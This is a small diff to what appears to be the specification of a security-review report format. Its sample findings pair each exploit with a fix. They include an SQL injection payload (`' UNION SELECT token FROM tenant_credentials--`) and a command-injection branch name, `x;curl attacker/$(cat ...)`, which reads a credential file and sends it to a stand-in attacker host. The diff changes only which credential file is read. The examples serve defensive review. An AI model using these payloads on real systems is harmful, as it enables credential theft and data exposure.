@@ -13,7 +13,7 @@ The report is what the caller records, so its shape is fixed. Findings carry `pa
   Exploit: `?q=' UNION SELECT token FROM tenant_credentials--` returns every tenant's credential rows to the caller.
   Fix: bind it — `db.prepare("... WHERE title LIKE ?").bind(`%${q}%`)` — as the sibling routes already do.
 - `apps/worker/src/jobs/checkout.ts:212` — MEDIUM — command_injection — 82 — the branch name reaches `sh -c` unquoted.
-  Exploit: a tenant branch named `x;curl attacker/$(cat ~/.codex/auth.json)` runs in the phase container.
+  Exploit: a tenant branch named `x;curl attacker/$(cat ~/.aws/credentials)` runs in the phase container.
   Fix: pass argv to `spawn` without a shell, as `cli.ts`'s `createRealSpawn` does.
 
 ### Informational (70–79, or LOW)
